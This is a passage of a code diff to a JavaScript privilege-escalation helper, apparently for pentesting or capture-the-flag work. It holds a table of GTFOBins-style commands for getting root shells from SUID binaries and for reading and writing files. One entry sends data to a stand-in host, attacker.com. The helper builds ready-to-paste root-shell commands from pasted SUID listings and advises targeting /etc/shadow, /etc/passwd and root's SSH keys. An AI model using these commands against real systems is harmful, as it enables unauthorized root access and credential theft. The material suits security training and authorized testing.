 {n:"time",f:"shell",b:"shell",s:"f",c:"time /bin/sh -p"},
 {n:"timeout",f:"shell",b:"shell",s:"f",c:"timeout 0 /bin/sh -p"},
@@ -2992,9 +2992,9 @@ const GTFO=[
 {n:"unexpand",f:"read",b:"read",c:"unexpand -t999 /path/to/input-file"},
 {n:"uniq",f:"read",b:"read",c:"uniq /path/to/input-file"},
 {n:"unshare",f:"shell",b:"shell",c:"unshare -r /bin/sh"},
-{n:"unsquashfs",f:"privesc",b:"privesc",c:"unsquashfs shell ./squashfs-root/sh -p"},
-{n:"unzip",f:"privesc",b:"privesc",c:"unzip -K shell.zip ./sh -p"},
-{n:"update-alternatives",f:"write",b:"write",c:"echo DATA >/path/to/temp-file update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0"},
+{n:"unsquashfs",f:"privesc",b:"privesc",c:"unsquashfs shell\n./squashfs-root/sh -p"},
+{n:"unzip",f:"privesc",b:"privesc",c:"unzip -K shell.zip\n./sh -p"},
+{n:"update-alternatives",f:"write",b:"write",c:"echo DATA >/path/to/temp-file\nupdate-alternatives --force --install /path/to/output-file x /path/to/temp-file 0"},
 {n:"urlget",f:"read",b:"read",c:"urlget - /path/to/input-file"},
 {n:"uuencode",f:"read",b:"read",c:"uuencode /path/to/input-file /dev/stdout | uudecode"},
 {n:"varnishncsa",f:"write",b:"write",c:"varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /path/to/output-file"},
@@ -3002,11 +3002,11 @@ const GTFO=[
 {n:"vigr",f:"inherit",b:"inherit",c:"vigr"},
 {n:"vim",f:"read,inherit",b:"read",c:"vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"},
 {n:"vipw",f:"inherit",b:"inherit",c:"vipw"},
-{n:"volatility",f:"inherit",b:"inherit",c:"volatility -f /path/to/core-dump volshell ..."},
+{n:"volatility",f:"inherit",b:"inherit",c:"volatility -f /path/to/core-dump volshell\n..."},
 {n:"w3m",f:"read",b:"read",c:"w3m -dump /path/to/input-file"},
 {n:"watch",f:"shell",b:"shell",s:"f",c:"watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'"},
 {n:"wc",f:"read",b:"read",c:"wc --files0-from /path/to/input-file"},
-{n:"wget",f:"shell,write,read,upload,download",b:"shell",s:"f",c:"echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file"},
+{n:"wget",f:"shell,write,read,upload,download",b:"shell",s:"f",c:"echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0"},
 {n:"whiptail",f:"read",b:"read",c:"whiptail --textbox --scrolltext /path/to/input-file 0 0"},
 {n:"whois",f:"upload,download",b:"upload",c:"whois -h attacker.com -p 12345 DATA"},
 {n:"wish",f:"inherit",b:"inherit",c:"wish"},
@@ -3018,7 +3018,7 @@ const GTFO=[
 {n:"xxd",f:"write,read",b:"write",c:"echo DATA | xxd | xxd -r - /path/to/output-file"},
 {n:"xz",f:"read",b:"read",c:"xz -c /path/to/input-file | xz -d"},
 {n:"yash",f:"shell",b:"shell",c:"yash"},
-{n:"zic",f:"cmd",b:"cmd",c:"echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file"},
+{n:"zic",f:"cmd",b:"cmd",c:"echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file\necho 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file\nzic -d . -y /path/to/command /path/to/temp-file"},
 {n:"zip",f:"shell,read",b:"shell",s:"t",c:"zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"},
 {n:"zless",f:"inherit",b:"inherit",c:"zless /path/to/input-file"},
 {n:"zsh",f:"shell,write,read,revsh,upload,download,inherit",b:"shell",c:"zsh"},
@@ -3030,6 +3030,8 @@ const GTFO_NOSUID=["7z","ansible-playbook","ansible-test","aoss","apache2ctl","a
 // CVEs, and pkexec is PwnKit -- but they are the ones that tell you nothing
 // by merely being present, so they are ranked last instead of hidden.
 const STD_SUID=new Set(["su","sudo","passwd","chsh","chfn","chage","gpasswd","newgrp","expiry",
+ "lxc-user-nic","lxc-usernsexec","bwrap","pam_extrausers_chkpwd","unix_update","usernetctl",
+ "mount.ecryptfs_private","ubuntu-core-launcher","vmware-authd","Xorg.wrap","ksu","staprun",
  "mount","umount","ping","ping6","fusermount","fusermount3","pkexec","at","sg","crontab",
  "ssh-keysign","dbus-daemon-launch-helper","polkit-agent-helper-1","unix_chkpwd","utempter",
  "chrome-sandbox","snap-confine","vmware-user-suid-wrapper","mount.nfs","mount.cifs","umount.nfs",
@@ -3085,10 +3087,12 @@ const SUID_WHAT={shell:"a straight root shell",cmd:"runs an arbitrary command as
 // Put the actual path into the command: GTFOBins writes "find ...", the box
 // has /opt/fileS, and pasting the GTFOBins line verbatim runs the wrong binary.
 function suidCmd(g,path){
+  // GTFOBins names the binary bare; the box has it somewhere else, and 19% of
+  // these are multi-line scripts where the invocation is not the first token.
   const esc=g.n.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");
-  const re=new RegExp("(^|[\\s|(])"+esc+"(?=[\\s]|$)");
+  const re=new RegExp("(^|[\\s|(`$])"+esc+"(?=\\s|$)","m");
   if(re.test(g.c))return g.c.replace(re,(mm,p1)=>p1+path);
-  return path+" "+g.c.replace(new RegExp("^"+esc+"\\s*"),"");
+  return path+" "+g.c;
 }
 
 function renderSuidXref(){
@@ -3105,44 +3109,74 @@ function renderSuidXref(){
     out.innerHTML="";
     const items=parseSuidList(ta.value);
     if(!items.length){hint.textContent="";out.innerHTML='<div class="plan-note">Paste the output of <code>find / -perm -4000 -type f 2&gt;/dev/null</code>.</div>';return;}
-    const win=[],useful=[],unknown=[],standard=[];
+    // Real find output is full of /snap/... copies of the same stock binaries.
+    // They are one finding, not eleven, so fold them onto the shortest path.
+    const byName=Object.create(null);
     items.forEach(it=>{
-      const r=gtfoLookup(it.name);
-      if(r.hit){(r.hit.b==="shell"?win:useful).push({it:it,g:r.hit,via:r.via});}
-      else if(STD_SUID.has(it.name))standard.push({it:it,known:r.known});
-      else unknown.push({it:it,known:r.known});
+      const k=it.name;
+      if(!byName[k]){byName[k]={name:k,path:it.path,extra:0};return;}
+      byName[k].extra++;
+      if(it.path.length<byName[k].path.length)byName[k].path=it.path;
     });
-    hint.textContent=items.length+" binaries \u2192 "+win.length+" root shell, "+useful.length+" useful, "+unknown.length+" unrecognised";
-    const group=(title,goal,colour,rows,build)=>{
+    const uniq=Object.keys(byName).map(k=>byName[k]);
+
+    const shellDirect=[],shellSystem=[],useful=[],noEntry=[],noRoute=[],standard=[];
+    uniq.forEach(it=>{
+      const r=gtfoLookup(it.name);
+      if(r.hit){
+        if(r.hit.b!=="shell")useful.push({it:it,g:r.hit,via:r.via});
+        else (r.hit.s==="t"?shellSystem:shellDirect).push({it:it,g:r.hit,via:r.via});
+      }
+      else if(STD_SUID.has(it.name))standard.push({it:it});
+      else if(r.known)noRoute.push({it:it});
+      else noEntry.push({it:it});
+    });
+    const shells=shellDirect.length+shellSystem.length;
+    hint.textContent=items.length+" pasted, "+uniq.length+" distinct \u2014 "+shells+" root shell, "+
+      useful.length+" useful, "+noEntry.length+" unrecognised";
+
+    const group=(title,goal,colour,rows,note,build)=>{
       if(!rows.length)return;
       const det=document.createElement("details");det.className="phase";det.open=true;det.style.setProperty("--c",colour);
       det.innerHTML='<summary><span class="num">'+rows.length+'</span><span class="phead"><div class="ptitle">'+title+
         '</div><div class="pgoal">'+goal+'</div></span><span class="pmeta"><span class="chev">\u203A</span></span></summary>';
       const body=document.createElement("div");body.className="pbody";
+      if(note){const nd=document.createElement("div");nd.className="plan-note";nd.innerHTML=note;body.appendChild(nd);}
       rows.forEach(r=>body.appendChild(build(r)));
       det.appendChild(body);out.appendChild(det);
     };
-    const stepFor=(r,note)=>{
+    const row=(r,tail)=>{
       const step=document.createElement("div");step.className="step";
       const main=document.createElement("div");main.className="step-main";
       const d=document.createElement("div");d.className="step-desc";
-      d.textContent=r.it.path+(r.via&&r.via!==r.it.name?"  (GTFOBins: "+r.via+")":"");
+      d.textContent=r.it.path
+        +(r.via&&r.via!==r.it.name?"  (GTFOBins: "+r.via+")":"")
+        +(r.it.extra?"  +"+r.it.extra+" more copy"+(r.it.extra>1?"ies":""):"");
       main.appendChild(d);
       if(r.g)main.appendChild(cmdLine(suidCmd(r.g,r.it.path)));
-      const look=document.createElement("div");look.className="look";look.innerHTML=note;main.appendChild(look);
+      if(tail){const look=document.createElement("div");look.className="look";look.innerHTML=tail;main.appendChild(look);}
       step.appendChild(main);return step;
     };
-    group("Root shell","GTFOBins has a SUID shell for these — start here","#f43f5e",win,
-      r=>stepFor(r,"<b>"+SUID_WHAT.shell+"</b>. Other SUID functions on this binary: <code>"+r.g.f+"</code>. "+
-        (r.g.s==="t"?"<b>Caveat from GTFOBins:</b> this one reaches the shell through <code>system()</code>, so it only lands on distributions whose <code>/bin/sh</code> does <i>not</i> drop SUID privileges — on Debian and Ubuntu (dash) it usually does, and you get your own uid back. Prefer a binary below that execs directly, or use this one's file-read/file-write function instead."
-         :"The <code>-p</code> is load-bearing: without it the shell drops the effective uid and hands you your own user back.")));
+    const fns=r=>"SUID functions: <code>"+r.g.f+"</code>";
+
+    group("Root shell","These exec a shell directly \u2014 start here","#f43f5e",shellDirect,
+      "The <code>-p</code> is load-bearing: without it the shell drops the effective uid and hands you back your own user.",
+      r=>row(r,fns(r)));
+    group("Root shell, but through system()","Only works where /bin/sh does not drop SUID privileges","#fb923c",shellSystem,
+      "GTFOBins flags these as reaching the shell via <code>system()</code>. On Debian and Ubuntu <code>/bin/sh</code> is dash and <b>does</b> drop the effective uid, so you get your own user back. Try them, but if one fails that is why \u2014 use its file-read or file-write function instead.",
+      r=>row(r,fns(r)));
     group("Useful, but not a shell on its own","Read, write or run something as root, then turn that into a shell","#fbbf24",useful,
-      r=>stepFor(r,"GTFOBins SUID functions: <code>"+r.g.f+"</code> \u2014 best here is <b>"+(SUID_WHAT[r.g.b]||r.g.b)+"</b>. A file-write is a uid-0 line in <code>/etc/passwd</code> or a root cron; a file-read is <code>/etc/shadow</code> or root's SSH key."));
-    group("No documented SUID route — look at these yourself","A custom SUID binary is usually the intended route","#c084fc",unknown,
-      r=>stepFor(r,r.known?"GTFOBins knows this binary but documents <b>no SUID technique</b> for it. Still check the version for CVEs."
-        :"No GTFOBins entry at all. If it is not a distro binary it was put there on purpose: run <code>strings</code> on it, watch it with <code>ltrace</code>/<code>strace</code>, and look for a command it calls by name (PATH hijack) or a file it reads that you can write."));
+      "A file-write is a uid-0 line in <code>/etc/passwd</code>, a root cron or an SSH key. A file-read is <code>/etc/shadow</code> or root\u2019s private key.",
+      r=>row(r,fns(r)+" \u2014 best here is <b>"+(SUID_WHAT[r.g.b]||r.g.b)+"</b>"));
+    group("Not in GTFOBins at all","A custom SUID binary is usually the intended route","#c084fc",noEntry,
+      "Nothing documented for these. If it is not a distro binary it was put there on purpose: run <code>strings</code> on it, watch it with <code>ltrace</code>/<code>strace</code>, and look for a command it calls by name (PATH hijack) or a file it reads that you can write.",
+      r=>row(r,""));
+    group("In GTFOBins, but no SUID technique","Documented binary, no published SUID route","#60a5fa",noRoute,
+      "GTFOBins knows these but publishes no SUID method, so do not burn time hunting for one. Check the version for CVEs instead.",
+      r=>row(r,""));
     group("Standard on any box","Expected SUID bits, listed last so they stop crowding the real findings","#94a3b8",standard,
-      r=>stepFor(r,"Ships SUID on a stock install. Worth a version check anyway \u2014 <code>pkexec</code> is PwnKit (CVE-2021-4034) and <code>sudo</code> below 1.9.5p2 is Baron Samedit."));
+      "These ship SUID on a stock install and tell you nothing by being present. Two are still worth a version check: <code>pkexec</code> is PwnKit (CVE-2021-4034) and <code>sudo</code> below 1.9.5p2 is Baron Samedit.",
+      r=>row(r,""));
     refreshTokens();
   };
   document.getElementById("suidBtn").addEventListener("click",run);
